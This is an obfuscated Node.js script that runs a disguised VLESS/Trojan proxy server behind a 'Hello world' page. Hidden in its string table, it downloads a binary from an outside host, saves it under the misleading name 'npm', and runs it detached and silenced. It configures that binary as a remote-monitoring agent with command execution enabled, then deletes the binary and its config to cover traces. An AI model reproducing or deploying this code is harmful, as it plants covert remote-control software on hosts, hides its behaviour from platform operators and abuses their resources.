const _0x457eaa=_0x2006;(function(_0x5b8601,_0x3f55d1){const _0x1ed4de=_0x2006,_0x5f3ba8=_0x5b8601();while(!![]){try{const _0x19117f=parseInt(_0x1ed4de(0x113))/0x1*(parseInt(_0x1ed4de(0x11d))/0x2)+parseInt(_0x1ed4de(0xf3))/0x3*(-parseInt(_0x1ed4de(0xf0))/0x4)+-parseInt(_0x1ed4de(0x11a))/0x5*(-parseInt(_0x1ed4de(0x10e))/0x6)+-parseInt(_0x1ed4de(0x13d))/0x7+parseInt(_0x1ed4de(0xeb))/0x8+-parseInt(_0x1ed4de(0x122))/0x9+-parseInt(_0x1ed4de(0xde))/0xa*(-parseInt(_0x1ed4de(0x11f))/0xb);if(_0x19117f===_0x3f55d1)break;else _0x5f3ba8['push'](_0x5f3ba8['shift']());}catch(_0x45a5bf){_0x5f3ba8['push'](_0x5f3ba8['shift']());}}}(_0x2a52,0x678d9));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x457eaa(0x13e)),net=require(_0x457eaa(0x12b)),path=require(_0x457eaa(0x10b)),crypto=require(_0x457eaa(0x148)),{Buffer}=require(_0x457eaa(0x100)),{exec,execSync}=require(_0x457eaa(0x11c)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x457eaa(0x135)]||_0x457eaa(0x14c),NEZHA_SERVER=process[_0x457eaa(0xef)][_0x457eaa(0xee)]||'',NEZHA_PORT=process[_0x457eaa(0xef)][_0x457eaa(0x13f)]||'',NEZHA_KEY=process[_0x457eaa(0xef)][_0x457eaa(0x11e)]||'',DOMAIN=process['env'][_0x457eaa(0x101)]||_0x457eaa(0xe8),AUTO_ACCESS=process[_0x457eaa(0xef)][_0x457eaa(0xfc)]||!![],WSPATH=process['env'][_0x457eaa(0x130)]||UUID[_0x457eaa(0x12f)](0x0,0x8),SUB_PATH=process[_0x457eaa(0xef)][_0x457eaa(0xf9)]||_0x457eaa(0xe4),NAME=process[_0x457eaa(0xef)][_0x457eaa(0x105)]||'Hug',PORT=process['env'][_0x457eaa(0xe7)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2ee7de=_0x457eaa;try{const _0x3810d6=await axios['get']('https://speed.cloudflare.com/meta'),_0x237e75=_0x3810d6['data'];ISP=(_0x237e75['country']+'-'+_0x237e75[_0x2ee7de(0x147)])[_0x2ee7de(0xea)](/ /g,'_');}catch(_0x4072a8){ISP=_0x2ee7de(0x156);}};GetISP();const httpServer=http[_0x457eaa(0x10a)]((_0x9464e1,_0x219a86)=>{const _0x17a8bf=_0x457eaa;if(_0x9464e1[_0x17a8bf(0x128)]==='/'){const _0x26d5fa=path[_0x17a8bf(0x116)](__dirname,_0x17a8bf(0x146));fs[_0x17a8bf(0x117)](_0x26d5fa,_0x17a8bf(0xf2),(_0xf3d39f,_0x418433)=>{const _0x278b62=_0x17a8bf;if(_0xf3d39f){_0x219a86[_0x278b62(0x132)](0xc8,{'Content-Type':'text/html'}),_0x219a86[_0x278b62(0x114)](_0x278b62(0x154));return;}_0x219a86[_0x278b62(0x132)](0xc8,{'Content-Type':_0x278b62(0x14a)}),_0x219a86['end'](_0x418433);});return;}else{if(_0x9464e1['url']==='/'+SUB_PATH){const _0x377900='vless://'+UUID+'@'+DOMAIN+_0x17a8bf(0x10d)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x47c6a9=_0x17a8bf(0xec)+UUID+'@'+DOMAIN+_0x17a8bf(0x107)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x2715f0=_0x377900+'\x0a'+_0x47c6a9,_0x413e69=Buffer['from'](_0x2715f0)[_0x17a8bf(0x14b)](_0x17a8bf(0x118));_0x219a86[_0x17a8bf(0x132)](0xc8,{'Content-Type':'text/plain'}),_0x219a86['end'](_0x413e69+'\x0a');}else _0x219a86[_0x17a8bf(0x132)](0x194,{'Content-Type':_0x17a8bf(0xf4)}),_0x219a86[_0x17a8bf(0x114)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x457eaa(0xe6))]({'server':httpServer}),uuid=UUID[_0x457eaa(0xea)](/-/g,''),DNS_SERVERS=[_0x457eaa(0xfe),_0x457eaa(0x109)];function resolveHost(_0x24622d){return new Promise((_0x3b6c7c,_0x116b9c)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x24622d)){_0x3b6c7c(_0x24622d);return;}let _0x4cb5a0=0x0;function _0x216a7d(){const _0x37a370=_0x2006;if(_0x4cb5a0>=DNS_SERVERS['length']){_0x116b9c(new Error(_0x37a370(0x151)+_0x24622d+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x5204b1=DNS_SERVERS[_0x4cb5a0];_0x4cb5a0++;const _0x2a4e32='https://dns.google/resolve?name='+encodeURIComponent(_0x24622d)+'&type=A';axios[_0x37a370(0xdf)](_0x2a4e32,{'timeout':0x1388,'headers':{'Accept':_0x37a370(0x157)}})[_0x37a370(0x12a)](_0x2de4ff=>{const _0x2e8530=_0x37a370,_0x2b95fc=_0x2de4ff['data'];if(_0x2b95fc[_0x2e8530(0x144)]===0x0&&_0x2b95fc[_0x2e8530(0x102)]&&_0x2b95fc[_0x2e8530(0x102)]['length']>0x0){const _0xff1641=_0x2b95fc['Answer'][_0x2e8530(0x149)](_0x26fe85=>_0x26fe85[_0x2e8530(0x143)]===0x1);if(_0xff1641){_0x3b6c7c(_0xff1641[_0x2e8530(0x140)]);return;}}_0x216a7d();})['catch'](_0x1b697a=>{_0x216a7d();});}_0x216a7d();});}function handleVlessConnection(_0xa74c09,_0xe8e0f1){const _0x1a22f1=_0x457eaa,[_0x55a690]=_0xe8e0f1,_0x1eb979=_0xe8e0f1[_0x1a22f1(0x12f)](0x1,0x11);if(!_0x1eb979[_0x1a22f1(0xf1)]((_0x15cc9c,_0x7d4172)=>_0x15cc9c==parseInt(uuid[_0x1a22f1(0x14d)](_0x7d4172*0x2,0x2),0x10)))return![];let _0x3833e1=_0xe8e0f1[_0x1a22f1(0x12f)](0x11,0x12)[_0x1a22f1(0xfb)]()+0x13;const _0x4c0fbc=_0xe8e0f1['slice'](_0x3833e1,_0x3833e1+=0x2)[_0x1a22f1(0x150)](0x0),_0x129ee9=_0xe8e0f1[_0x1a22f1(0x12f)](_0x3833e1,_0x3833e1+=0x1)[_0x1a22f1(0xfb)](),_0x1e662e=_0x129ee9==0x1?_0xe8e0f1[_0x1a22f1(0x12f)](_0x3833e1,_0x3833e1+=0x4)[_0x1a22f1(0x116)]('.'):_0x129ee9==0x2?new TextDecoder()[_0x1a22f1(0xe1)](_0xe8e0f1[_0x1a22f1(0x12f)](_0x3833e1+0x1,_0x3833e1+=0x1+_0xe8e0f1[_0x1a22f1(0x12f)](_0x3833e1,_0x3833e1+0x1)['readUInt8']())):_0x129ee9==0x3?_0xe8e0f1[_0x1a22f1(0x12f)](_0x3833e1,_0x3833e1+=0x10)['reduce']((_0xc82030,_0x45e566,_0x17538f,_0x192bbc)=>_0x17538f%0x2?_0xc82030[_0x1a22f1(0x145)](_0x192bbc['slice'](_0x17538f-0x1,_0x17538f+0x1)):_0xc82030,[])[_0x1a22f1(0xfa)](_0x331ef5=>_0x331ef5[_0x1a22f1(0x150)](0x0)[_0x1a22f1(0x14b)](0x10))[_0x1a22f1(0x116)](':'):'';_0xa74c09[_0x1a22f1(0x10f)](new Uint8Array([_0x55a690,0x0]));const _0x5cc16a=createWebSocketStream(_0xa74c09);return resolveHost(_0x1e662e)[_0x1a22f1(0x12a)](_0x9d38ba=>{const _0x18e728=_0x1a22f1;net[_0x18e728(0x108)]({'host':_0x9d38ba,'port':_0x4c0fbc},function(){const _0x5077aa=_0x18e728;this['write'](_0xe8e0f1[_0x5077aa(0x12f)](_0x3833e1)),_0x5cc16a['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x5077aa(0x153)](_0x5cc16a);})['on'](_0x18e728(0xff),()=>{});})[_0x1a22f1(0xe5)](_0x3cce29=>{const _0x27a3c8=_0x1a22f1;net[_0x27a3c8(0x108)]({'host':_0x1e662e,'port':_0x4c0fbc},function(){const _0x34bfdc=_0x27a3c8;this[_0x34bfdc(0x119)](_0xe8e0f1[_0x34bfdc(0x12f)](_0x3833e1)),_0x5cc16a['on'](_0x34bfdc(0xff),()=>{})['pipe'](this)['on']('error',()=>{})[_0x34bfdc(0x153)](_0x5cc16a);})['on'](_0x27a3c8(0xff),()=>{});}),!![];}function handleTrojanConnection(_0x50edcc,_0x4d3099){const _0x324b40=_0x457eaa;try{if(_0x4d3099[_0x324b40(0x141)]<0x3a)return![];const _0x4534fe=_0x4d3099['slice'](0x0,0x38)[_0x324b40(0x14b)](),_0x16d501=[UUID];let _0x270e7b=null;for(const _0x218743 of _0x16d501){const _0x49db12=crypto[_0x324b40(0x138)](_0x324b40(0xe0))['update'](_0x218743)[_0x324b40(0x11b)]('hex');if(_0x49db12===_0x4534fe){_0x270e7b=_0x218743;break;}}if(!_0x270e7b)return![];let _0x202ed3=0x38;_0x4d3099[_0x202ed3]===0xd&&_0x4d3099[_0x202ed3+0x1]===0xa&&(_0x202ed3+=0x2);const _0x57259f=_0x4d3099[_0x202ed3];if(_0x57259f!==0x1)return![];_0x202ed3+=0x1;const _0x5f34ea=_0x4d3099[_0x202ed3];_0x202ed3+=0x1;let _0x26c7e1,_0xee421b;if(_0x5f34ea===0x1)_0x26c7e1=_0x4d3099[_0x324b40(0x12f)](_0x202ed3,_0x202ed3+0x4)[_0x324b40(0x116)]('.'),_0x202ed3+=0x4;else{if(_0x5f34ea===0x3){const _0x53d790=_0x4d3099[_0x202ed3];_0x202ed3+=0x1,_0x26c7e1=_0x4d3099[_0x324b40(0x12f)](_0x202ed3,_0x202ed3+_0x53d790)[_0x324b40(0x14b)](),_0x202ed3+=_0x53d790;}else{if(_0x5f34ea===0x4)_0x26c7e1=_0x4d3099[_0x324b40(0x12f)](_0x202ed3,_0x202ed3+0x10)[_0x324b40(0x12d)]((_0x5086be,_0x274a51,_0x274fc4,_0x58aa4f)=>_0x274fc4%0x2?_0x5086be[_0x324b40(0x145)](_0x58aa4f[_0x324b40(0x12f)](_0x274fc4-0x1,_0x274fc4+0x1)):_0x5086be,[])['map'](_0x30e891=>_0x30e891[_0x324b40(0x150)](0x0)[_0x324b40(0x14b)](0x10))[_0x324b40(0x116)](':'),_0x202ed3+=0x10;else return![];}}_0xee421b=_0x4d3099[_0x324b40(0x150)](_0x202ed3),_0x202ed3+=0x2;_0x202ed3<_0x4d3099[_0x324b40(0x141)]&&_0x4d3099[_0x202ed3]===0xd&&_0x4d3099[_0x202ed3+0x1]===0xa&&(_0x202ed3+=0x2);const _0xa1a67e=createWebSocketStream(_0x50edcc);return resolveHost(_0x26c7e1)[_0x324b40(0x12a)](_0x36d206=>{const _0x46354c=_0x324b40;net[_0x46354c(0x108)]({'host':_0x36d206,'port':_0xee421b},function(){const _0xfcd681=_0x46354c;_0x202ed3<_0x4d3099[_0xfcd681(0x141)]&&this['write'](_0x4d3099['slice'](_0x202ed3)),_0xa1a67e['on'](_0xfcd681(0xff),()=>{})[_0xfcd681(0x153)](this)['on'](_0xfcd681(0xff),()=>{})[_0xfcd681(0x153)](_0xa1a67e);})['on']('error',()=>{});})[_0x324b40(0xe5)](_0x299a36=>{const _0x85ab8e=_0x324b40;net[_0x85ab8e(0x108)]({'host':_0x26c7e1,'port':_0xee421b},function(){const _0x1cdfe5=_0x85ab8e;_0x202ed3<_0x4d3099[_0x1cdfe5(0x141)]&&this[_0x1cdfe5(0x119)](_0x4d3099['slice'](_0x202ed3)),_0xa1a67e['on'](_0x1cdfe5(0xff),()=>{})[_0x1cdfe5(0x153)](this)['on'](_0x1cdfe5(0xff),()=>{})['pipe'](_0xa1a67e);})['on'](_0x85ab8e(0xff),()=>{});}),!![];}catch(_0x12bd8b){return![];}}function _0x2a52(){const _0x596a11=['write','243820zTiOoh','digest','child_process','2EkaQAy','NEZHA_KEY','1145969dKQGYA','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x20-p\x20','7325667XZEwwt','arm64','unlink','message','connection','finish','url','https://','then','net','8443','reduce','application/json','slice','WSPATH','aarch64','writeHead','setsid\x20nohup\x20./npm\x20-s\x20','post','UUID','split','2053','createHash','npm\x20is\x20already\x20running,\x20skip\x20running...','config.yaml','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','listen','2425542zIBBvv','axios','NEZHA_PORT','data','length','npm\x20download\x20successfully','type','Status','concat','index.html','asOrganization','crypto','find','text/html','toString','d4894400-6741-41e4-891c-6ef2dcbd45cf','substr','https://amd64.ssss.nyc.mn/agent','443','readUInt16BE','Failed\x20to\x20resolve\x20','--tls','pipe','Hello\x20world!','close','Unknown','application/dns-json','writeFileSync','error:\x20','trim','10UsyoVb','get','sha224','decode','https://arm64.ssss.nyc.mn/v1','once','sub','catch','Server','PORT','1234.abc.com','log','replace','5685056SguzGt','trojan://','https://arm64.ssss.nyc.mn/agent','NEZHA_SERVER','env','119960UTKZGh','every','utf8','15qpfsst','text/plain','arm','true','npm\x20is\x20running','utf-8','SUB_PATH','map','readUInt8','AUTO_ACCESS','npm','8.8.4.4','error','buffer','DOMAIN','Answer','chmod\x20+x\x20npm','npm\x20running\x20error:','NAME','includes',':443?security=tls&sni=','connect','1.1.1.1','createServer','path','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',':443?encryption=none&security=tls&sni=','42Epkljw','send','stream','/bin/bash','2083','578413aAtTzu','end','https://oooo.serv00.net/add-url','join','readFile','base64'];_0x2a52=function(){return _0x596a11;};return _0x2a52();}wss['on'](_0x457eaa(0x126),(_0xcc5aa7,_0x505143)=>{const _0x2fdf80=_0x457eaa,_0x41bd18=_0x505143[_0x2fdf80(0x128)]||'';_0xcc5aa7[_0x2fdf80(0xe3)](_0x2fdf80(0x125),_0x3e49eb=>{const _0x38b62f=_0x2fdf80;if(_0x3e49eb[_0x38b62f(0x141)]>0x11&&_0x3e49eb[0x0]===0x0){const _0x14ffa7=_0x3e49eb[_0x38b62f(0x12f)](0x1,0x11),_0x2e51c5=_0x14ffa7[_0x38b62f(0xf1)]((_0x50cf35,_0x106f9d)=>_0x50cf35==parseInt(uuid[_0x38b62f(0x14d)](_0x106f9d*0x2,0x2),0x10));if(_0x2e51c5){!handleVlessConnection(_0xcc5aa7,_0x3e49eb)&&_0xcc5aa7[_0x38b62f(0x155)]();return;}}!handleTrojanConnection(_0xcc5aa7,_0x3e49eb)&&_0xcc5aa7[_0x38b62f(0x155)]();})['on'](_0x2fdf80(0xff),()=>{});});const getDownloadUrl=()=>{const _0x9d9f43=_0x457eaa,_0x1c7c0d=os['arch']();return _0x1c7c0d===_0x9d9f43(0xf5)||_0x1c7c0d===_0x9d9f43(0x123)||_0x1c7c0d===_0x9d9f43(0x131)?!NEZHA_PORT?_0x9d9f43(0xe2):_0x9d9f43(0xed):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x9d9f43(0x14e);},downloadFile=async()=>{const _0x320ddf=_0x457eaa;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4e257c=getDownloadUrl(),_0x1570b2=await axios({'method':_0x320ddf(0xdf),'url':_0x4e257c,'responseType':_0x320ddf(0x110)}),_0x3ca8d0=fs['createWriteStream'](_0x320ddf(0xfd));return _0x1570b2[_0x320ddf(0x140)][_0x320ddf(0x153)](_0x3ca8d0),new Promise((_0x16215c,_0x2d2b02)=>{const _0x4d7cd7=_0x320ddf;_0x3ca8d0['on'](_0x4d7cd7(0x127),()=>{const _0x1b3bf8=_0x4d7cd7;console[_0x1b3bf8(0xe9)](_0x1b3bf8(0x142)),exec(_0x1b3bf8(0x103),_0x369248=>{if(_0x369248)_0x2d2b02(_0x369248);_0x16215c();});}),_0x3ca8d0['on'](_0x4d7cd7(0xff),_0x2d2b02);});}catch(_0x517123){throw _0x517123;}},runnz=async()=>{const _0x279640=_0x457eaa;try{const _0x4dc0a8=execSync(_0x279640(0x13b),{'encoding':_0x279640(0xf8)});if(_0x4dc0a8[_0x279640(0xdd)]()!==''){console[_0x279640(0xe9)](_0x279640(0x139));return;}}catch(_0x5ac3fe){}await downloadFile();let _0x17b7dd='',_0x3edbe7=[_0x279640(0x14f),_0x279640(0x12c),'2096','2087',_0x279640(0x112),_0x279640(0x137)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x21b3c0=_0x3edbe7[_0x279640(0x106)](NEZHA_PORT)?_0x279640(0x152):'';_0x17b7dd=_0x279640(0x133)+NEZHA_SERVER+':'+NEZHA_PORT+_0x279640(0x121)+NEZHA_KEY+'\x20'+_0x21b3c0+_0x279640(0x10c);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x20770d=NEZHA_SERVER[_0x279640(0x106)](':')?NEZHA_SERVER[_0x279640(0x136)](':')['pop']():'',_0x40532a=_0x3edbe7['includes'](_0x20770d)?_0x279640(0xf6):'false',_0x4140d4='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x40532a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x279640(0x158)](_0x279640(0x13a),_0x4140d4);}_0x17b7dd='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x279640(0xe9)](_0x279640(0x120));return;}}try{exec(_0x17b7dd,{'shell':_0x279640(0x111)},_0x19eeeb=>{const _0x31d518=_0x279640;if(_0x19eeeb)console['error'](_0x31d518(0x104),_0x19eeeb);else console[_0x31d518(0xe9)](_0x31d518(0xf7));});}catch(_0x17bf05){console['error'](_0x279640(0x159)+_0x17bf05);}};async function addAccessTask(){const _0xafc1f3=_0x457eaa;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2ce850=_0xafc1f3(0x129)+DOMAIN;try{const _0x59320c=await axios[_0xafc1f3(0x134)](_0xafc1f3(0x115),{'url':_0x2ce850},{'headers':{'Content-Type':_0xafc1f3(0x12e)}});console[_0xafc1f3(0xe9)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x590999){}}const delFiles=()=>{const _0x5d761d=_0x457eaa;fs['unlink'](_0x5d761d(0xfd),()=>{}),fs[_0x5d761d(0x124)](_0x5d761d(0x13a),()=>{});};function _0x2006(_0x1244c4,_0x54af4a){const _0x2a528e=_0x2a52();return _0x2006=function(_0x2006ee,_0x56392e){_0x2006ee=_0x2006ee-0xdd;let _0x204338=_0x2a528e[_0x2006ee];return _0x204338;},_0x2006(_0x1244c4,_0x54af4a);}httpServer[_0x457eaa(0x13c)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
